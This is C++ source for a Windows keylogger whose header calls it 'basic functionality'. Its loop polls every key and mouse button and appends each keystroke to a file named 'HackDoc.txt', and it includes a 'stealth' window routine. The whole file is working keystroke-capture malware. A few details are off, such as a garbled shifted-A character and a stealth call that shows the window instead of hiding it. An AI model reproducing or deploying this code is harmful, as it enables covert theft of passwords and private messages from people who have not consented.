#include "basic_func.h"


/*******************************************************************/

/* Date: 10-06-2018                                                */

/* Developer: Artem Gord1728                                       */

/* Copyright: 2018 Artem Gord1728. All rights reserved.           */

/* Description: Code with basic functionality                      */

/*******************************************************************/




void K_Logger::WriteToFile(LPCSTR text)
{
	std::ofstream doc_to;
	doc_to.open("HackDoc.txt", std::fstream::app);
	doc_to << text;
	doc_to.close();
}

int K_Logger::SaveSymbol(WORD iKey)
{
	switch (iKey)
	{
		case 48:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << ")";
				WriteToFile(")");
			}
			else
			{
				std::cout << "0";
				WriteToFile("0");
			}
			break;

		case 49:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "!";
				WriteToFile("!");
			}
			else
			{
				std::cout << "1";
				WriteToFile("1");
			}
			break;

		case 50:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "@";
				WriteToFile("@");
			}
			else
			{
				std::cout << "2";
				WriteToFile("2");
			}
			break;

		case 51:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "#";
				WriteToFile("#");
			}
			else
			{
				std::cout << "3";
				WriteToFile("3");
			}
			break;

		case 52:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "$";
				WriteToFile("$");
			}
			else
			{
				std::cout << "4";
				WriteToFile("4");
			}
			break;

		case 53:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "%";
				WriteToFile("%");
			}
			else
			{
				std::cout << "5";
				WriteToFile("5");
			}
			break;

		case 54:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "^";
				WriteToFile("^");
			}
			else
			{
				std::cout << "6";
				WriteToFile("6");
			}
			break;

		case 55:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "&";
				WriteToFile("&");
			}
			else
			{
				std::cout << "7";
				WriteToFile("7");
			}
			break;

		case 56:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "*";
				WriteToFile("*");
			}
			else
			{
				std::cout << "8";
				WriteToFile("8");
			}
			break;

		case 57:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "(";
				WriteToFile("(");
			}
			else
			{
				std::cout << "9";
				WriteToFile("9");
			}
			break;

		case 65:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "À";
				WriteToFile("À");
			}
			else
			{
				std::cout << "a";
				WriteToFile("a");
			}
			break;

		case 66:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "B";
				WriteToFile("B");
			}
			else
			{
				std::cout << "b";
				WriteToFile("b");
			}
			break;

		case 67:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "C";
				WriteToFile("C");
			}
			else
			{
				std::cout << "c";
				WriteToFile("c");
			}
			break;

		case 68:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "D";
				WriteToFile("D");
			}
			else
			{
				std::cout << "d";
				WriteToFile("d");
			}
			break;

		case 69:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "E";
				WriteToFile("E");
			}
			else
			{
				std::cout << "e";
				WriteToFile("e");
			}
			break;

		case 70:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "F";
				WriteToFile("F");
			}
			else
			{
				std::cout << "f";
				WriteToFile("f");
			}
			break;

		case 71:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "G";
				WriteToFile("G");
			}
			else
			{
				std::cout << "g";
				WriteToFile("g");
			}
			break;

		case 72:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "H";
				WriteToFile("H");
			}
			else
			{
				std::cout << "h";
				WriteToFile("h");
			}
			break;

		case 73:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "I";
				WriteToFile("I");
			}
			else
			{
				std::cout << "i";
				WriteToFile("i");
			}
			break;

		case 74:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "J";
				WriteToFile("J");
			}
			else
			{
				std::cout << "j";
				WriteToFile("j");
			}
			break;


		case 75:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "K";
				WriteToFile("K");
			}
			else
			{
				std::cout << "k";
				WriteToFile("k");
			}
			break;


		case 76:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "L";
				WriteToFile("L");
			}
			else
			{
				std::cout << "l";
				WriteToFile("l");
			}
			break;

		case 77:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "M";
				WriteToFile("M");
			}
			else
			{
				std::cout << "m";
				WriteToFile("m");
			}
			break;


		case 78:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "N";
				WriteToFile("N");
			}
			else
			{
				std::cout << "n";
				WriteToFile("n");
			}
			break;

		case 79:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "O";
				WriteToFile("O");
			}
			else
			{
				std::cout << "o";
				WriteToFile("o");
			}
			break;

		case 80:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "P";
				WriteToFile("P");
			}
			else
			{
				std::cout << "p";
				WriteToFile("p");
			}
			break;

		case 81:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "Q";
				WriteToFile("Q");
			}
			else
			{
				std::cout << "q";
				WriteToFile("q");
			}
			break;

		case 82:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "R";
				WriteToFile("R");
			}
			else
			{
				std::cout << "r";
				WriteToFile("r");
			}
			break;

		case 83:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "S";
				WriteToFile("S");
			}
			else
			{
				std::cout << "s";
				WriteToFile("s");
			}
			break;

		case 84:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "T";
				WriteToFile("T");
			}
			else
			{
				std::cout << "t";
				WriteToFile("t");
			}
			break;

		case 85:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "U";
				WriteToFile("U");
			}
			else
			{
				std::cout << "u";
				WriteToFile("u");
			}
			break;

		case 86:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "V";
				WriteToFile("V");
			}
			else
			{
				std::cout << "v";
				WriteToFile("v");
			}
			break;

		case 87:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "W";
				WriteToFile("W");
			}
			else
			{
				std::cout << "w";
				WriteToFile("w");
			}
			break;

		case 88:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "X";
				WriteToFile("X");
			}
			else
			{
				std::cout << "x";
				WriteToFile("x");
			}
			break;

		case 89:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "Y";
				WriteToFile("Y");
			}
			else
			{
				std::cout << "y";
				WriteToFile("y");
			}
			break;

		case 90:
			if (GetAsyncKeyState(0xA0) || GetAsyncKeyState(0xA1))
			{
				std::cout << "Z";
				WriteToFile("Z");
			}
			else
			{
				std::cout << "z";
				WriteToFile("z");
			}
			break;




		case 0x70:
			std::cout << "  *F1*  ";
			WriteToFile("  *F1*  ");
			break;

		case 0x71:
			std::cout << "  *F2*  ";
			WriteToFile("  *F2*  ");
			break;

		case 0x72:
			std::cout << "  *F3*  ";
			WriteToFile("  *F3*  ");
			break;

		case 0x73:
			std::cout << "  *F4*  ";
			WriteToFile("  *F4*  ");
			break;

		case 0x74:
			std::cout << "  *F5*  ";
			WriteToFile("  *F5*  ");
			break;

		case 0x75:
			std::cout << "  *F6*  ";
			WriteToFile("  *F6*  ");
			break;

		case 0x76:
			std::cout << "  *F7*  ";
			WriteToFile("  *F7*  ");
			break;

		case 0x77:
			std::cout << "  *F8*  ";
			WriteToFile("  *F8*  ");
			break;

		case 0x78:
			std::cout << "  *F9*  ";
			WriteToFile("  *F9*  ");
			break;

		case 0x79:
			std::cout << "  *F10*  ";
			WriteToFile("  *F10*  ");
			break;

		case 0x7A:
			std::cout << "  *F11*  ";
			WriteToFile("  *F11*  ");
			break;

		case 0x23:
			std::cout << "  *END*  ";
			WriteToFile("  *END*  ");
			break;

		case 0x7B:
			std::cout << "  *F12*  ";
			WriteToFile("  *F12*  ");
			break;

		case 0x24:
			std::cout << "  *HOME*  ";
			WriteToFile("  *HOME*  ");
			break;

		case 0x90:
			std::cout << "  *Num_Lock*  ";
			WriteToFile("  *Num_Lock*  ");
			break;

		case 0x5C:
			std::cout << "  *Right_Windows*  ";
			WriteToFile("  *Right_Windows*  ");
			break;

		case 0x60:
			std::cout << "0";
			WriteToFile("0");
			break;




		//+-+-+-+-+-+All figures below are NUMPAD-+-+-+-+-+
		//+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
		case 0x61:
			std::cout << "1";
			WriteToFile("1");
			break;

		case 0x62:
			std::cout << "2";
			WriteToFile("2");
			break;

		case 0x63:
			std::cout << "3";
			WriteToFile("3");
			break;

		case 0x64:
			std::cout << "4";
			WriteToFile("4");
			break;

		case 0x65:
			std::cout << "5";
			WriteToFile("5");
			break;

		case 0x66:
			std::cout << "6";
			WriteToFile("6");
			break;

		case 0x67:
			std::cout << "7";
			WriteToFile("7");
			break;

		case 0x68:
			std::cout << "8";
			WriteToFile("8");
			break;

		case 0x69:
			std::cout << "9";
			WriteToFile("9");
			break;

		case 0x6E:
			std::cout << ".";
			WriteToFile(".");
			break;

		case 0x6D:
			std::cout << "-";
			WriteToFile("-");
			break;

		case 0x6A:
			std::cout << "*";
			WriteToFile("*");
			break;

		case 0x6F:
			std::cout << "/";
			WriteToFile("/");
			break;

		case 0x6B:
			std::cout << "+";
			WriteToFile("+");
			break;
    	//+-+-+-+-+-+-+-+--+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	   //+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+



		case 0x5B:
			std::cout << "Left_Win";
			WriteToFile("Left_Win");
			break;


		case 0x20:
			std::cout << " ";
			WriteToFile(" ");
			break;

		case 0x09:
			std::cout << " *TAB* ";
			WriteToFile(" *TAB* ");
			break;

		case 0x04:
			std::cout << "  *mouse_middle-button*  ";
			WriteToFile("  *mouse_middle-button*  ");
			break;

		case 0xA4:
			std::cout << "  *Left_ALT*  ";
			WriteToFile("  *Left_ALT*  ");
			break;

		case 0x2c:
			std::cout << "  *PRINT_SCREEN*  ";
			WriteToFile("  *PRINT_SCREEN*  ");
			break;

		case 0x14:
			std::cout << "  *CAPS_LOCK*  ";
			WriteToFile("  *CAPS_LOCK*  ");
			break;

		case 0x0D:
			std::cout << "\n";
			WriteToFile("\n");
			break;

		case 0xA0:
			std::cout << " *Left_Shift* ";
			WriteToFile(" *Left_Shift* ");
			break;

		case 0xA1:
			std::cout << " *Right_Shift* ";
			WriteToFile(" *Right_Shift* ");
			break;

		case 0x08:
			std::cout << "\b";
			WriteToFile("\b");
			break;


		case 0x1B:
			std::cout << " *Esc* ";
			WriteToFile(" *Esc* ");
			break;

		case 0x26:
			std::cout << " btn_up ";
			WriteToFile(" btn_up ");
			break;

		case 0x28:
			std::cout << " btn_down ";
			WriteToFile(" btn_down ");
			break;

		case 0x25:
			std::cout << " btn_left ";
			WriteToFile(" btn_left ");
			break;

		case 0x27:
			std::cout << " btn_right ";
			WriteToFile(" btn_right ");
			break;

		case 0x11:
			std::cout << " btn_ctrl ";
			WriteToFile(" btn_ctrl ");
			break;

		case 0x2D:
			std::cout << " Insert ";
			WriteToFile(" Insert ");
			break;

		case 0x2E:
			std::cout << " *Delete* ";
			WriteToFile(" Delete ");
			break;


		case 0x02:
			std::cout << "*mouse_right*";
			WriteToFile("*mouse_right*");
			break;

		case 0x01:
			std::cout << "*mouse_left*";
			WriteToFile("*mouse_left*");
			break;
	}
	return 0;
}

void K_Logger::VisibilityApp()
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindow",NULL);
	ShowWindow(stealth, 1);
}


int main()
{
	setlocale(LC_ALL, "ru");

	char key;

	K_Logger kl;

	while (true)
	{
		Sleep(10);
		for (key = 8; key <= 250; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				kl.SaveSymbol(key);
			}
		}
	}
	system("pause");
	return 0;
}